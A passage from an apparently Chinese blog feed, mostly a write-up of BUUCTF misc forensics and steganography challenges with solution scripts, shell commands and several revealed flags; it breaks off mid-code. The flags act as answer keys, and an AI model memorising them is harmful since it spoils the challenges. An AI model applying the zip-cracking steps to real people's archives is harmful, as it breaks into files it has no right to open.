    <summary type="html">&lt;h1 id=&quot;OS&quot;&gt;&lt;a href=&quot;#OS&quot; class=&quot;headerlink&quot; title=&quot;OS&quot;&gt;&lt;/a&gt;OS&lt;/h1&gt;&lt;p&gt;OS模块简单的来说它是一个Python的系统编程的操作模块，可以处理文件和目录这些我们日常手动需要做的操作。&lt;/p&gt;
&lt;h2 id=&quot;使用方</summary>
      
    
    
    
    <category term="Python学习" scheme="http://s1eady.top/categories/Python%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="Python" scheme="http://s1eady.top/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>CTF-杂项刷题3</title>
    <link href="http://s1eady.top/2020/10/30/CTF-%E6%9D%82%E9%A1%B9%E5%88%B7%E9%A2%982/"/>
    <id>http://s1eady.top/2020/10/30/CTF-%E6%9D%82%E9%A1%B9%E5%88%B7%E9%A2%982/</id>
    <published>2020-10-30T10:23:13.000Z</published>
    <updated>2020-11-06T11:51:14.685Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Buuctf"><a href="#Buuctf" class="headerlink" title="Buuctf"></a>Buuctf</h1><h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><h3 id="爬"><a href="#爬" class="headerlink" title="爬"></a>爬</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;_key.ftm.extracted$ file &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;_key.ftm.extracted&#x2F;爬</span><br><span class="line">&#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;_key.ftm.extracted&#x2F;爬: PDF document, version 1.7</span><br></pre></td></tr></table></figure><p>pdf文件打开。图片背后有十六进制转化得到flag。</p><h3 id="WUSTCTF2020-girlfriend"><a href="#WUSTCTF2020-girlfriend" class="headerlink" title="[WUSTCTF2020]girlfriend"></a>[WUSTCTF2020]girlfriend</h3><p>dtmf-decoder</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;_key.ftm.extracted$ dtmf2num &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;_key.ftm.extracted&#x2F;girlfriend.wav</span><br><span class="line"></span><br><span class="line">DTMF2NUM 0.1.1</span><br><span class="line">by Luigi Auriemma</span><br><span class="line">e-mail: aluigi@autistici.org</span><br><span class="line">web:    aluigi.org</span><br><span class="line"></span><br><span class="line">- open &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;_key.ftm.extracted&#x2F;girlfriend.wav</span><br><span class="line">  wave size      7466540</span><br><span class="line">  format tag     1</span><br><span class="line">  channels:      2</span><br><span class="line">  samples&#x2F;sec:   44100</span><br><span class="line">  avg&#x2F;bytes&#x2F;sec: 176400</span><br><span class="line">  block align:   4</span><br><span class="line">  bits:          16</span><br><span class="line">  samples:       3733270</span><br><span class="line">  bias adjust:   215</span><br><span class="line">  volume peaks:  -12024 12025</span><br><span class="line">  normalize:     20742</span><br><span class="line">  resampling to: 8000hz</span><br><span class="line"></span><br><span class="line">- MF numbers:    47777777</span><br><span class="line"></span><br><span class="line">- DTMF numbers:  999*666*88*2*777*33*6*999*4*4444*777*555*333*777*444*33*66*3*7777</span><br></pre></td></tr></table></figure><p>手机键盘。</p><p>ttl隐写。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">63    00111111</span><br><span class="line">127   01111111</span><br><span class="line">191   10111111</span><br><span class="line">255   11111111</span><br></pre></td></tr></table></figure><p>每一个 TTL 只有前两位隐藏数据，每四个为一组，隐藏一个字节。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    a=fp.readlines()</span><br><span class="line">    p=[]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(len(a)):</span><br><span class="line">       p.append(int(a[x])) </span><br><span class="line">    s=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> p:</span><br><span class="line">        <span class="keyword">if</span>(i==<span class="number">63</span>):</span><br><span class="line">            b=<span class="string">&#x27;00&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span>(i==<span class="number">127</span>):</span><br><span class="line">            b=<span class="string">&#x27;01&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span>(i==<span class="number">191</span>):</span><br><span class="line">            b=<span class="string">&#x27;10&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            b=<span class="string">&#x27;11&#x27;</span></span><br><span class="line">        s +=b</span><br><span class="line"><span class="comment"># print(s)</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(s),<span class="number">8</span>):</span><br><span class="line">    flag += chr(int(s[i:i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>发现是一个压缩包。一键脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span>():</span></span><br><span class="line">    f = open(<span class="string">&#x27;t.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    fh = open(<span class="string">&#x27;flag.zip&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    binstring = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    hexstring = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> f.readlines():</span><br><span class="line">        bins = <span class="string">&#x27;&#123;:08b&#125;&#x27;</span>.format(int(num.strip()))</span><br><span class="line">        binstring += bins[:<span class="number">2</span>]</span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(binstring), <span class="number">8</span>):</span><br><span class="line">        hexstring += chr(int(binstring[i:i+<span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">    fh.write(binascii.unhexlify(hexstring))</span><br><span class="line">    fh.close()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    print(<span class="string">&quot;Start...&quot;</span>)</span><br><span class="line">    Decrypt()</span><br><span class="line">    print(<span class="string">&quot;Done!&quot;</span>)</span><br></pre></td></tr></table></figure><p>伪加密，循环base64解密。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base64decode</span>():</span></span><br><span class="line">    f = open(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    flag = f.read()</span><br><span class="line">    <span class="keyword">while</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> flag:</span><br><span class="line">        flag = base64.b64decode(flag)</span><br><span class="line">    print(flag)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    print(<span class="string">&quot;Start...&quot;</span>)</span><br><span class="line">    base64decode()</span><br><span class="line">    print(<span class="string">&#x27;Done!&#x27;</span>)</span><br></pre></td></tr></table></figure><p>有大量的ICMP数据包，并且icmp数据包有data字段，直接wireshark提取。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r out.pcap -T fields -e &quot;data&quot; &gt;flag.txt</span><br></pre></td></tr></table></figure><p>发现txt中有大量重复的数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2424535441525424242d2d2d2d2d424547494e2043455254494649434154452d2d2d2d2d0a</span><br></pre></td></tr></table></figure><p>每4行都是重复的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort 1.txt | uniq &gt;&gt;2.txt</span><br></pre></td></tr></table></figure><p>python批量转十六进制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">lines&#x3D;open(&#39;out.txt&#39;,&#39;rb&#39;).readlines()</span><br><span class="line">file&#x3D;open(&#39;old_file.txt&#39;,&#39;wb&#39;)</span><br><span class="line">i&#x3D;0</span><br><span class="line">for line in lines:</span><br><span class="line">        if i%4&#x3D;&#x3D;0:</span><br><span class="line">                file.write(line.strip().decode(&#39;hex&#39;))</span><br><span class="line">        i+&#x3D;1</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><p>像是十六进制，但是每行头上有<code>$$START$$+</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">lines=open(<span class="string">&#x27;old_file.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).readlines()</span><br><span class="line">file=open(<span class="string">&#x27;new_file&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines[<span class="number">1</span>:<span class="number">-1</span>]:</span><br><span class="line">    result+=line[<span class="number">9</span>:].strip()</span><br><span class="line">file.write(base64.b64decode(result))</span><br></pre></td></tr></table></figure><p>得到一个zip。一个gif。查看每一帧的间隔时间。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">identify -verbose flag.gif | grep Delay</span><br><span class="line">  Delay: 50x100</span><br><span class="line">  Delay: 50x100</span><br><span class="line">  Delay: 50x100</span><br><span class="line">  Delay: 20x100</span><br><span class="line">  Delay: 50x100</span><br><span class="line">  Delay: 20x100</span><br><span class="line">  Delay: 20x100</span><br><span class="line">  Delay: 66x100</span><br><span class="line">  Delay: 66x100</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">identify -format &quot;%s %T \n&quot; flag.gif </span><br></pre></td></tr></table></figure><p>把20改成0,50改成1 转下ascii。</p><h3 id="GUET-CTF2019-虚假的压缩包"><a href="#GUET-CTF2019-虚假的压缩包" class="headerlink" title="[GUET-CTF2019]虚假的压缩包"></a>[GUET-CTF2019]虚假的压缩包</h3><p>两个压缩包，一个未加密，一个真密码。伪加密解压出来是rsa题，解密得到密码–答案是5。解压真压缩包，拿到一张图片和一个文件，图片修改高度。提示^5。即把文件与5异或。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">f1 = open(<span class="string">&#x27;./cipher&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">xor_data = f1.read()</span><br><span class="line">f1.close()</span><br><span class="line">dec_data = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xor_data:</span><br><span class="line">    tmp = int(i,<span class="number">16</span>) ^ <span class="number">5</span></span><br><span class="line">    dec_data += hex(tmp)[<span class="number">2</span>:]</span><br><span class="line">print(dec_data[:<span class="number">10</span>])</span><br></pre></td></tr></table></figure><p><code>504b030414</code>是个压缩包，保存为压缩包。打开之后发现是个word。改为doc。</p><p>拿到许多英文句子，直接搜索flag。发现flag被隐藏。直接改颜色。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/48.png" alt="48"></p><h3 id="easy-misc"><a href="#easy-misc" class="headerlink" title="easy misc"></a>easy misc</h3><p>掩码攻击拿到压缩包内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">a = dIW</span><br><span class="line">b = sSD</span><br><span class="line">c = adE </span><br><span class="line">d = jVf</span><br><span class="line">e = QW8</span><br><span class="line">f = SA=</span><br><span class="line">g = jBt</span><br><span class="line">h = <span class="number">5</span>RE</span><br><span class="line">i = tRQ</span><br><span class="line">j = SPA</span><br><span class="line">k = <span class="number">8</span>DS</span><br><span class="line">l = XiE</span><br><span class="line">m = S8S</span><br><span class="line">n = MkF</span><br><span class="line">o = T9p</span><br><span class="line">p = PS5</span><br><span class="line">q = E/S</span><br><span class="line">r = -sd</span><br><span class="line">s = SQW</span><br><span class="line">t = obW</span><br><span class="line">u = /WS</span><br><span class="line">v = SD9</span><br><span class="line">w = cw=</span><br><span class="line">x = ASD</span><br><span class="line">y = FTa</span><br><span class="line">z = AE7</span><br></pre></td></tr></table></figure><p>词频分析。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">file = open(<span class="string">&#x27;./1.txt&#x27;</span>)</span><br><span class="line">line = file.readlines()</span><br><span class="line">file.seek(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">file.close()</span><br><span class="line"></span><br><span class="line">result = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">97</span>,<span class="number">123</span>):</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> line:</span><br><span class="line">find_line = re.findall(chr(i),j)</span><br><span class="line">count += len(find_line)</span><br><span class="line">result[chr(i)] = count</span><br><span class="line">res = sorted(result.items(),key=<span class="keyword">lambda</span> item:item[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">num = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> res:</span><br><span class="line">print(<span class="string">&#x27;频数第&#123;0&#125;: &#x27;</span>.format(num),x)</span><br><span class="line">num += <span class="number">1</span> </span><br></pre></td></tr></table></figure><h3 id="派大星的烦恼"><a href="#派大星的烦恼" class="headerlink" title="派大星的烦恼"></a>派大星的烦恼</h3><p>放入01edito，找到<code>&quot;DD&quot;``DD``&quot;&quot;&quot;&quot;D&quot;DD&quot;&quot;&quot;``&quot;&quot;&quot;DD&quot;&quot;&quot;``DD&quot;DD&quot;``&quot;D&quot;``&quot;DDD&quot;``&quot;D&quot;``D``&quot;DD&quot;``&quot;&quot;&quot;&quot;``&quot;DD&quot;``&quot;D&quot;``&quot;&quot;``&quot;DD&quot;``D``&quot;D&quot;``DD&quot;&quot;&quot;``&quot;D&quot;``DD&quot;``&quot;D&quot;``&quot;``&quot;DD&quot;``&quot;&quot;&quot;``&quot;DDD&quot;``&quot;&quot;``&quot;D&quot;``DD&quot;&quot;``&quot;D&quot;``&quot;``&quot;DD&quot;``&quot;``&quot;D&quot;``&quot;DD&quot;``D``&quot;D&quot;``DD``&quot;&quot;&quot;DD&quot;&quot;DD&quot;D&quot;D&quot;&quot;DD&quot;&quot;DD&quot;DD&quot;&quot;&quot;``D``&quot;&quot;&quot;DD&quot;&quot;DD&quot;DD&quot;&quot;D&quot;D&quot;&quot;DD&quot;D&quot;D&quot;DD&quot;&quot;&quot;``D``&quot;&quot;&quot;DD&quot;&quot;&quot;``D&quot;DD&quot;``&quot;DD&quot;``&quot;``&quot;DD&quot;``D``&quot;D&quot;``&quot;DD&quot;``&quot;``&quot;D&quot;``DD&quot;``&quot;DD&quot;``&quot;DD&quot;``&quot;&quot;&quot;``&quot;DDD&quot;``&quot;DD&quot;``&quot;DD&quot;``&quot;``&quot;D&quot;``&quot;DD&quot;``&quot;</code>。</p><p>D变1，”变成0。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin_to_str</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> [int(b, <span class="number">2</span>) <span class="keyword">for</span> b <span class="keyword">in</span> s.split(<span class="string">&#x27; &#x27;</span>)]])</span><br><span class="line">a = <span class="string">&quot;01101100 00101100 00001100 01101100 10011100 10101100 00001100 10000110 10101100 00101100 10001100 00011100 00101100 01000110 00100110 10101100 01100110 10100110 01101100 01000110 01101100 10100110 10101100 01000110 00101100 11000110 10100110 00101100 11001100 00011100 11001100 01001100&quot;</span></span><br><span class="line">a = a.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    test=i[::<span class="number">-1</span>]</span><br><span class="line">    flag+=bin_to_str(test)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h3 id="GKCTF2020-Harley-Quinn"><a href="#GKCTF2020-Harley-Quinn" class="headerlink" title="[GKCTF2020]Harley Quinn"></a>[GKCTF2020]Harley Quinn</h3><p>使用<code>dtmf2num</code>，解密没成功。使用<code>multimon-ng</code></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ multimon-ng -t wav -a dtmf /home/steady/桌面/steady/Heathens.wav</span><br><span class="line">multimon-ng <span class="number">1.1</span><span class="number">.9</span></span><br><span class="line">  (C) <span class="number">1996</span>/<span class="number">1997</span> by Tom Sailer HB9JNX/AE4WA</span><br><span class="line">  (C) <span class="number">2012</span><span class="number">-2020</span> by Elias Oenal</span><br><span class="line">Available demodulators: POCSAG512 POCSAG1200 POCSAG2400 FLEX EAS UFSK1200 CLIPFSK FMSFSK AFSK1200 AFSK2400 AFSK2400_2 AFSK2400_3 HAPN4800 FSK9600 DTMF ZVEI1 ZVEI2 ZVEI3 DZVEI PZVEI EEA EIA CCIR MORSE_CW DUMPCSV X10 SCOPE</span><br><span class="line">Enabled demodulators: DTMF</span><br><span class="line">DTMF: <span class="comment">#</span></span><br><span class="line">DTMF: <span class="number">2</span></span><br><span class="line">DTMF: <span class="number">2</span></span><br><span class="line">DTMF: <span class="number">2</span></span><br><span class="line">DTMF: <span class="number">8</span></span><br><span class="line">DTMF: <span class="number">3</span></span><br><span class="line">DTMF: <span class="number">4</span></span><br><span class="line">DTMF: <span class="number">4</span></span><br><span class="line">DTMF: <span class="number">4</span></span><br><span class="line">DTMF: <span class="number">7</span></span><br><span class="line">DTMF: <span class="number">7</span></span><br><span class="line">DTMF: <span class="number">7</span></span><br><span class="line">DTMF: <span class="number">7</span></span><br><span class="line">DTMF: <span class="number">3</span></span><br><span class="line">DTMF: <span class="number">8</span></span><br><span class="line">DTMF: <span class="number">8</span></span><br><span class="line">DTMF: <span class="number">6</span></span><br><span class="line">DTMF: <span class="number">6</span></span><br><span class="line">DTMF: <span class="comment">#</span></span><br><span class="line">sox WARN rate: rate clipped 2152 samples; decrease volume?</span><br><span class="line">sox WARN dither: dither clipped 1920 samples; decrease volume?</span><br></pre></td></tr></table></figure><p>手机密码。</p><h3 id="粽子的来历"><a href="#粽子的来历" class="headerlink" title="粽子的来历"></a>粽子的来历</h3><p>doc打不开，尝试修改某处为FF。打开在后行间距转化0或者1。</p><h3 id="BSidesSF2019-zippy"><a href="#BSidesSF2019-zippy" class="headerlink" title="[BSidesSF2019]zippy"></a>[BSidesSF2019]zippy</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;media$ tcpxtract -f attachment.pcapng</span><br><span class="line">Found file of type &quot;zip&quot; in session [192.168.56.2:4244 -&gt; 192.168.56.104:23825], exporting to 00000000.zip</span><br></pre></td></tr></table></figure><h3 id="WUSTCTF2020-spaceclub"><a href="#WUSTCTF2020-spaceclub" class="headerlink" title="[WUSTCTF2020]spaceclub"></a>[WUSTCTF2020]spaceclub</h3><p>text文件空白，全选，每一行的长短对应一个二进制数字。长为1，断为0。最后转二进制。</p><h3 id="CTF2019-otaku"><a href="#CTF2019-otaku" class="headerlink" title="[*CTF2019]otaku"></a>[*CTF2019]otaku</h3><p>一个压缩包、一个word，打开word，打开隐藏文字。发现多了一下的文字。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello everyone, I am Gilbert. Everyone thought that I was killed, but actually I survived. Now that I have no cash with me and I’m trapped in another country. I can&#39;t contact Violet now. She must be desperate to see me and I don&#39;t want her to cry for me. I need to pay 300 for the train, and 88 for the meal. Cash or battlenet point are both accepted.&#x2F;&#x2F;最后可以看到明文攻击。</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/51.png" alt="51"></p><p>可以看到这时候CRC一样。可以进行明文攻击。拿到图片，lsb隐写。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf&#123;vI0l3t_Ev3rg@RdeN&#125;</span><br></pre></td></tr></table></figure><h3 id="ACTF新生赛2020-music"><a href="#ACTF新生赛2020-music" class="headerlink" title="[ACTF新生赛2020]music"></a>[ACTF新生赛2020]music</h3><p>放入winhex中，发现大量的A1。将文件与A1进行异或。发现文件头<code>0000001866747970</code>，mp4文件格式。修改后缀，听音乐拿到flag。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/52.png" alt="52"></p><h3 id="voip"><a href="#voip" class="headerlink" title="voip"></a>voip</h3><p>数据包，voip：互联网协议语音（VoIP），也称为IP电话，简称电话。</p><p>点击播放流并播放即有声音读出flag：seccon{9001IVR}</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/53.png" alt="53"></p><p>读取电话音频。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/54.png" alt="54"></p><h3 id="湖南省赛2019-Findme"><a href="#湖南省赛2019-Findme" class="headerlink" title="[湖南省赛2019]Findme"></a>[湖南省赛2019]Findme</h3><p>七张图，一张一张分析。</p><p>第一张，图片高度明显小，直接CRC爆破，拿到图片，发现高度可以了但是图片模糊了。</p><p>然后使用<code>Stegsolve</code>打开，在<code>blue 2</code>通道发现二维码。扫描拿到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3s0X3</span><br></pre></td></tr></table></figure><p>第二张图，binwalk分离，没有分离出来东西。<code>strings</code>查看，发现有txt字样。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CRys</span><br><span class="line">CRys</span><br><span class="line">2&#x2F;998.txt</span><br><span class="line">jRys</span><br><span class="line">jRys</span><br><span class="line">jRys</span><br><span class="line">2&#x2F;999.txt</span><br></pre></td></tr></table></figure><p>可以判定藏有压缩包。尝试搜搜常见的压缩包头部，比如zip、7z等等，但是都没有发现什么线索。直接搜索png尾部，<code>49 45 4E 44 AE 42 60 82</code>。发现后面的数据为<code>37 7A 03 04</code>。有点像zip的头部，直接修改504B。打开之后发现文件打不开，提示文件损坏。返回看看，发现zip中有7z字样，最后直接把所有的7z替换为PK。导出十六进制，然后放入notepad，把37 7A替换为50 4B。保存，还是不能打开最后直接使用winrar进行修复。解压拿到许多文件。解压对文件大小进行排序，发现618.txt在第一个直接打开发现<code>You find it: 1RVcmVfc</code>。</p><p>第三个图片。</p><p>chunk[0]-chunk[6]的每一个数据块的crc值都是可打印的Ascii字符。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/57.png" alt="57"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a &#x3D; [0x33,0x52,0x6C,0x5A,0x33,0x30,0x3D]</span><br><span class="line">for i in a:</span><br><span class="line">    print(chr(i),end&#x3D;&quot;&quot;)</span><br><span class="line"></span><br><span class="line">#运行结果：3RlZ30&#x3D;</span><br></pre></td></tr></table></figure><p>第四个图片。</p><p><code>exiftool</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 